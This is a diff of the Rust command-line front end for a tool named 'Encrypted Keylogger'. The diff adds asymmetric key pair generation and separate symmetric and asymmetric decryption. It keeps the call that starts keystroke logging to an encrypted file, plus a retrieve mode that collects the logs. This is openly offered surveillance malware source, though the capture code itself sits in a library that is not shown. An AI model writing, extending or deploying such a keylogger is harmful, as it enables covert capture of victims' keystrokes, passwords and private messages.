@@ -1,19 +1,31 @@
+#[macro_use]
 extern crate clap;
 
 extern crate keylogger_lib;
 
 fn main() {
     let args = clap::App::new("Encrypted Keylogger")
-        .version("0.1.2")
+        .version(crate_version!())
         .author("Hand of C'thulhu")
+        .arg(clap::Arg::with_name("generate")
+            .long("generate")
+            .conflicts_with_all(&["decrypt", "retrieve", "bot_addr"])
+            .takes_value(false))
         .arg(clap::Arg::with_name("decrypt")
             .short("D")
             .long("decrypt")
             .value_name("FILE")
             .help("Specify the decrypt file, and turn into decrypt mode")
             .takes_value(true)
-            //.requires("key")
             .min_values(0))
+        .arg(clap::Arg::with_name("asymmetric")
+            .short("A")
+            .long("asym")
+            .takes_value(false))
+        .arg(clap::Arg::with_name("asymmetric_keys")
+            .long("asym-keys")
+            .min_values(2).takes_value(true)
+            .value_names(&["PUB_KEY_FILE", "SEC_KEY_FILE"]))
         .arg(clap::Arg::with_name("retrieve")
             .short("R")
             .long("retrieve")
@@ -31,9 +43,26 @@ fn main() {
 //            .long("key")
 //            .takes_value(true)
 //            .value_name("FILE")
-//            .required_unless("retrieve")
-            .required(true))
+            .required_unless("asymmetric_keys"))
         .get_matches();
+
+    if args.is_present("generate") {
+        if let Some(data) = args.values_of("asymmetric_keys") {
+            let data: Vec<&str> = data.collect();
+            if data.len() != 2 {
+                panic!("Asymmetric flag missing second argument")
+            }
+            if let Err(err) = keylogger_lib::gen_key_pair(data[0], data[1]) {
+                println!("{}", err.description());
+            } else {
+                println!("Public and private key generated");
+            }
+        } else {
+            let key_path = args.value_of("KEY").unwrap();
+            keylogger_lib::generate_key_and_nonce(key_path).expect("Key generation failed");
+        }
+        return;
+    }
 
     if let Some(retrieve_path) = args.value_of("retrieve") {
         let retrieve_path = std::path::Path::new(retrieve_path);
@@ -56,27 +85,61 @@ fn main() {
                     .expect("Open problems")
                     .write(data.as_ref())
                     .expect("Write problems");
-
                 output_path
             }).collect::<Vec<std::path::PathBuf>>()
         }).collect();
         let encrypted_data_paths: Vec<&std::path::PathBuf> = encrypted_data_paths.iter().flat_map(|p| p).collect();
         println!("{:?}", encrypted_data_paths);
-        if args.is_present("decrypt") {
-            for path in encrypted_data_paths {
-                keylogger_lib::decrypt(path.to_str().unwrap(), args.value_of("KEY").unwrap()).unwrap_or_else(|err| println!("Error with decrypting: {}", err));
+
+        if !args.is_present("decrypt") { return; }
+
+        for path in encrypted_data_paths {
+            if let Some(data) = args.values_of("asymmetric_keys") {
+                let data: Vec<&str> = data.collect();
+                if data.len() != 2 {
+                    println!("Asymmetric flag missing second argument");
+                    return;
+                }
+                keylogger_lib::decrypt_asym(path.to_str().unwrap(), data[0], data[1])
+                    .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
+            } else {
+                keylogger_lib::decrypt_sym(path.to_str().unwrap(), args.value_of("KEY").unwrap())
+                    .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
             }
         }
+
         return;
     }
-    let key_path = args.value_of("KEY").unwrap();
+
+
     if let Some(decrypt_path) = args.value_of("decrypt") {
-        keylogger_lib::decrypt(decrypt_path, key_path).unwrap_or_else(|err| println!("Error with decrypting: {}", err));
-    } else {
-        if let Err(problem) = keylogger_lib::generate_key_and_nonce(key_path) {
-            println!("Error with key input: {}", problem.description());
+        if let Some(data) = args.values_of("asymmetric_keys") {
+            let data: Vec<&str> = data.collect();
+            if data.len() != 2 {
+                println!("{}", data.len());
+                println!("Asymmetric flag missing second argument");
+                return;
+            }
+            keylogger_lib::decrypt_asym(decrypt_path, data[0], data[1])
+                .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
         } else {
-            keylogger_lib::key_log(key_path);
+            keylogger_lib::decrypt_sym(decrypt_path, args.value_of("KEY").unwrap())
+                .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
+        }
+    } else {
+        let key_path = args.value_of("KEY").unwrap();
+        if args.is_present("asymmetric") {
+            if let Err(problem) = keylogger_lib::get_public_key(key_path) {
+                println!("Error with key input: {}", problem.description());
+            } else {
+                keylogger_lib::key_log(args.value_of("KEY").unwrap(), true);
+            }
+        } else {
+            if let Err(problem) = keylogger_lib::generate_key_and_nonce(key_path) {
+                println!("Error with key input: {}", problem.description());
+            } else {
+                keylogger_lib::key_log(key_path, false);
+            }
         }
     }
 }
